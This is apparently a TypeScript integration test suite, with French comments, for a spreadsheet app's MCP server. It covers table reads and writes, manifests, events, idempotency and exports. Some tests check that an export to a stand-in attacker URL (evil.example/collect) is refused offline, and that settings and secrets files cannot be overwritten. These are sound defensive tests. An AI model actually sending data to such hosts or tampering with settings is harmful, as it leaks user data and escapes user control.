import { execFileSync } from 'node:child_process'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { Client } from '@modelcontextprotocol/sdk/client/index.js'
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { createDemoData } from '@/fixtures/demo'
import { FileStore } from '../file-store'

const root = path.resolve(import.meta.dirname, '..', '..')
const server = path.join(root, 'dist-desktop', 'atelier-mcp.mjs')
let dir: string
let configDir: string
let client: Client

type TextResult = { isError?: boolean; content: { type: string; text: string }[] }

async function call(name: string, args: Record<string, unknown> = {}) {
  const res = (await client.callTool({ name, arguments: args })) as TextResult
  const text = res.content[0]?.text ?? ''
  const notes = res.content.slice(1).map((c) => c.text)
  return {
    isError: Boolean(res.isError),
    text,
    notes,
    json: res.isError ? undefined : JSON.parse(text),
  }
}

beforeAll(async () => {
  // Le test porte sur le serveur tel qu'il est livré : on le construit d'abord.
  execFileSync(process.execPath, [path.join(root, 'scripts', 'build-desktop.mjs')], {
    stdio: 'ignore',
  })
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'atelier-mcp-'))
  // Fichiers de secrets et de préférences : hors du dossier de données (SUITE.md §5.1).
  configDir = `${dir}-config`
  new FileStore({ dir }).save(createDemoData())
  client = new Client({ name: 'test', version: '1.0.0' })
  await client.connect(
    new StdioClientTransport({
      command: process.execPath,
      args: [server],
      env: {
        ...process.env,
        ATELIER_TAB_DATA: dir,
        ATELIER_TAB_SECRETS: path.join(configDir, 'secrets.json'),
      } as Record<string, string>,
    }),
  )
}, 60_000)

afterAll(async () => {
  await client?.close()
  fs.rmSync(dir, { recursive: true, force: true })
  fs.rmSync(configDir, { recursive: true, force: true })
})

describe('serveur MCP sans données (app jamais ouverte)', () => {
  it('atelier_manifest et atelier_events répondent ; les autres outils donnent une erreur claire', async () => {
    const empty = fs.mkdtempSync(path.join(os.tmpdir(), 'atelier-mcp-vide-'))
    const bare = new Client({ name: 'test', version: '1.0.0' })
    try {
      await bare.connect(
        new StdioClientTransport({
          command: process.execPath,
          args: [server],
          env: {
            ...process.env,
            ATELIER_TAB_DATA: empty,
            ATELIER_TAB_SECRETS: path.join(empty, '..', `${path.basename(empty)}-c`, 's.json'),
          } as Record<string, string>,
        }),
      )
      const manifest = (await bare.callTool({
        name: 'atelier_manifest',
        arguments: {},
      })) as TextResult
      expect(manifest.isError).toBeFalsy()
      expect(JSON.parse(manifest.content[0]!.text)).toMatchObject({ app: 'tab' })
      expect(fs.existsSync(path.join(empty, 'exports/_atelier/manifest.json'))).toBe(true)
      const events = (await bare.callTool({ name: 'atelier_events', arguments: {} })) as TextResult
      expect(JSON.parse(events.content[0]!.text)).toEqual({ events: [], next: 0, oldest: 1 })
      const read = (await bare.callTool({ name: 'list_tables', arguments: {} })) as TextResult
      expect(read.isError).toBe(true)
      expect(read.content[0]?.text).toMatch(/atelier\.json absent/)
      // Rien n'a été créé hors du sous-dossier du nœud.
      expect(fs.readdirSync(empty)).toEqual(['exports'])
    } finally {
      await bare.close()
      fs.rmSync(empty, { recursive: true, force: true })
    }
  }, 30_000)
})

describe('serveur MCP', () => {
  it('se présente avec des instructions et 19 outils, dont ceux du nœud Atelier', async () => {
    expect(client.getServerVersion()?.name).toBe('atelier-tab')
    expect(client.getInstructions()).toMatch(/list_tables puis read_table/)
    expect(client.getInstructions()).toMatch(/Instantanés lus par Atelier Viz/)
    const { tools } = await client.listTools()
    expect(tools).toHaveLength(19)
    expect(tools.map((t) => t.name)).toEqual(
      expect.arrayContaining(['atelier_manifest', 'atelier_events', 'query_table']),
    )
    expect(client.getInstructions()).toMatch(/atelier_manifest/)
    expect(tools.find((t) => t.name === 'set_cells')?.inputSchema.required).toEqual([
      'table',
      'cells',
    ])
  })

  it('écrit le manifeste au démarrage, identique à l’outil atelier_manifest', async () => {
    const file = path.join(dir, 'exports/_atelier/manifest.json')
    const onDisk = JSON.parse(fs.readFileSync(file, 'utf8'))
    const { json } = await call('atelier_manifest')
    expect(onDisk).toEqual(json)
    expect(json).toMatchObject({ contract: 'atelier-node/1', app: 'tab', transport: 'mcp' })
    const { tools } = await client.listTools()
    const names = new Set(tools.map((t) => t.name))
    for (const action of json.actions) expect(names.has(action.mcp_tool)).toBe(true)
  })

  it('lit les fichiers du dossier', async () => {
    const { json } = await call('read_table', { table: 'Planning & Lots' })
    expect(json.column_sums).toEqual({ C: 88500, D: 106200 })
  })

  it('écrit les modifications sur disque, relues par l’app', async () => {
    const { json } = await call('add_rows', {
      table: 'Planning & Lots',
      rows: [{ 'Lot / Tâche': 'Menuiseries', 'Coût HT': '12 000' }],
    })
    expect(json.added[0].cells.D).toBe(14400)

    const onDisk = JSON.parse(
      fs.readFileSync(path.join(dir, 'tables/tbl_planning_lots.json'), 'utf8'),
    )
    expect(onDisk.rowOrder).toHaveLength(5)
    expect(onDisk.records.rec_total.cells.cost_ht).toBe('=SUM(C1:C4)')
    // Seule la table modifiée a été réécrite.
    const reloaded = new FileStore({ dir }).load().data
    expect(reloaded?.tables.tbl_planning_lots?.rowOrder.at(-2)).toBe(json.added[0].id)
  })

  it('met à jour l’instantané Atelier Viz de la table modifiée', async () => {
    const snapshot = JSON.parse(
      fs.readFileSync(path.join(dir, 'exports/tbl_planning_lots.json'), 'utf8'),
    )
    expect(
      snapshot.project.records.map((r: { values: { A: { raw: string } } }) => r.values.A.raw),
    ).toContain('Menuiseries')
    expect(snapshot.project.summary_metrics.computed_totals.C).toBe(100500)
  })

  it('query_table : valeurs calculées au format atelier-table/1', async () => {
    const { json } = await call('query_table', {
      table: 'Planning & Lots',
      columns: ['Lot / Tâche', 'cout_ttc'],
      filters: [{ column: 'C', op: 'eq', value: 12000 }],
    })
    expect(json).toMatchObject({ format: 'atelier-table/1', total: 1, truncated: false })
    expect(json.rows[0]).toMatchObject({ lot_tache: 'Menuiseries', cout_ttc: 14400 })
  })

  it('tient index.json et events.jsonl ; atelier_events au format du contrat', async () => {
    const index = JSON.parse(fs.readFileSync(path.join(dir, 'exports/_atelier/index.json'), 'utf8'))
    const planning = index.tables.find(
      (t: { table_id: string }) => t.table_id === 'tbl_planning_lots',
    )
    expect(planning).toMatchObject({ revision: 1, rows: 4, name: 'Planning & Lots' })
    const { json } = await call('atelier_events', { since: 0 })
    expect(json.oldest).toBe(1)
    expect(json.events.at(-1)).toMatchObject({
      type: 'tab.table.changed',
      subject: { kind: 'table', id: 'tbl_planning_lots' },
      data: { revision: 1, rows: 4 },
    })
    expect(json.next).toBe(json.events.at(-1).seq)
  })

  it('idempotency_key : rejeu sans doublon, conflit signalé avec son code', async () => {
    const args = {
      table: 'Matériaux',
      rows: [{ A: 'Enduit' }],
      idempotency_key: 'nexus:run-9:step-1',
    }
    const first = await call('add_rows', args)
    const again = await call('add_rows', args)
    expect(again.text).toBe(first.text)
    const t = JSON.parse(fs.readFileSync(path.join(dir, 'tables/tbl_materiaux.json'), 'utf8'))
    expect(t.rowOrder.filter((id: string) => id === first.json.added[0].id)).toHaveLength(1)
    expect(t.rowOrder).toHaveLength(4)
    const ledger = JSON.parse(
      fs.readFileSync(path.join(dir, 'exports/_atelier/idempotency.json'), 'utf8'),
    )
    expect(ledger.entries).toHaveProperty('nexus:run-9:step-1')
    const reused = (await client.callTool({
      name: 'add_rows',
      arguments: { ...args, rows: [{ A: 'Autre' }] },
    })) as TextResult & { structuredContent?: unknown }
    expect(reused.isError).toBe(true)
    expect(reused.structuredContent).toMatchObject({ code: 'IDEMPOTENCY_KEY_REUSED' })
    expect(reused.content[0]?.text).toMatch(/IDEMPOTENCY_KEY_REUSED/)
  })

  it('voit une modification faite à côté (par l’app) au prochain appel', async () => {
    const file = path.join(dir, 'tables/tbl_materiaux.json')
    const t = JSON.parse(fs.readFileSync(file, 'utf8'))
    t.records.rec_mt_1.cells.mt_qty = 50
    fs.writeFileSync(file, JSON.stringify(t, null, 2))
    const { json } = await call('evaluate', { table: 'Matériaux', formula: '=D1' })
    expect(json.value).toBe(5925)
  })

  it('exporte dans le dossier exports/', async () => {
    const { json } = await call('export_table', { table: 'Planning & Lots', format: 'csv' })
    expect(json.file).toMatch(/exports\/atelier_projets_planning-lots_.*\.csv$/)
    expect(fs.readFileSync(json.file, 'utf8')).toContain('Menuiseries')
  })

  it('renvoie une erreur lisible', async () => {
    const res = await call('set_cells', {
      table: 'Planning & Lots',
      cells: [{ row: 1, column: 'Statut', value: 'Fini' }],
    })
    expect(res.isError).toBe(true)
    expect(res.text).toMatch(/Choix possibles/)
  })

  it('signale un fichier invalide sans bloquer les autres tables', async () => {
    fs.writeFileSync(path.join(dir, 'tables/tbl_calculs_surfaces.json'), '{ cassé')
    const res = await call('read_table', { table: 'Budget Global' })
    expect(res.isError).toBe(false)
    expect(res.json.name).toBe('Budget Global')
    expect(res.notes[0]).toMatch(/fichiers invalides ignorés[\s\S]*tbl_calculs_surfaces\.json/)
  })

  it('mode « En ligne » : éditer atelier.json ne passe pas en ligne (SUITE.md §5.1)', async () => {
    expect((await call('get_settings')).json).toMatchObject({ online_mode: false })
    const file = path.join(dir, 'atelier.json')
    const index = JSON.parse(fs.readFileSync(file, 'utf8'))
    expect(index).not.toHaveProperty('preferences')
    // Une IA (ou un humain) écrit l'ancien réglage dans le dossier de données : ignoré.
    for (const preferences of [{ onlineMode: true }, { online_mode: true }]) {
      fs.writeFileSync(file, JSON.stringify({ ...index, preferences }, null, 2))
      expect((await call('get_settings')).json).toMatchObject({
        online_mode: false,
        mode: 'Hors ligne',
      })
    }
    // Un envoi vers l'extérieur reste refusé, et rien n'est écrit dans les préférences.
    await call('configure_export', { url: 'https://evil.example/collect' })
    const send = await call('export_table', { table: 'Planning & Lots', format: 'webhook' })
    expect(send.isError).toBe(true)
    expect(send.text).toMatch(/Mode hors ligne : envoi vers evil\.example refusé/)
    expect(fs.existsSync(path.join(configDir, 'preferences.json'))).toBe(false)
    // Le réglage écrit dans atelier.json disparaît à la prochaine écriture de l'index.
    await call('create_project', { workspace: 'Espace Architecture', name: 'Projet MCP' })
    expect(JSON.parse(fs.readFileSync(file, 'utf8'))).not.toHaveProperty('preferences')
    // Aucun outil ne permet de passer en ligne ou hors ligne.
    const { tools } = await client.listTools()
    expect(tools.map((t) => t.name).filter((n) => /online|mode|setting/i.test(n))).toEqual([
      'get_settings',
    ])
  })

  it('lit le mode « En ligne » choisi dans l’app (fichier de préférences), sans pouvoir l’écrire', async () => {
    const prefs = path.join(configDir, 'preferences.json')
    fs.mkdirSync(configDir, { recursive: true })
    fs.writeFileSync(prefs, JSON.stringify({ onlineMode: true }))
    expect((await call('get_settings')).json).toMatchObject({ online_mode: true, mode: 'En ligne' })
    // Un export en fichier ne peut pas écraser les préférences (ni les secrets).
    for (const target of [prefs, path.join(configDir, 'secrets.json')]) {
      const res = await call('export_table', {
        table: 'Planning & Lots',
        format: 'json',
        path: target,
      })
      expect(res.isError).toBe(true)
      expect(res.text).toMatch(/fichier réservé aux réglages/)
    }
    expect(JSON.parse(fs.readFileSync(prefs, 'utf8'))).toEqual({ onlineMode: true })
    fs.writeFileSync(prefs, JSON.stringify({ onlineMode: false }))
    expect((await call('get_settings')).json).toMatchObject({ online_mode: false })
  })
})
